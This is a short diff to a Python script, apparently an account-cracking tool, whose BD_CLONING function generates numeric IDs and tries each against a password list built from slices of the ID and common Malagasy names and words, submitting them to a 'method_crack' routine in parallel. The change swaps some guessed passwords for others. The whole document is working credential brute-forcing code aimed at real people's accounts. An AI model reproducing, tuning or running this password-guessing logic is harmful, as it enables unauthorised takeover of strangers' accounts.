@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'Mamako','mamako','fitiavana','Fitiavana','lafatra','Lafatra','lahatra','Lahatra','nomena','Nomena','valisoa','Valisoa','hasina','Hasina','tantely','Tantely','Koloina','koloina','randria','Randria','Malala','malala','malalako','Malalako','milely','Milely','mahery','Mahery','mendrika','Mendrika']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','fitiavana','Fitiavana','fanirina','Fanirina','fiderana','Fiderana','nomena','Nomena','henika','Henika','hasina','Hasina','tantely','Tantely','Koloina','koloina','randria','Randria','Malala','malala','mandresy','Mandresy','milely','Milely','mahery','Mahery','mendrika','Mendrika']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
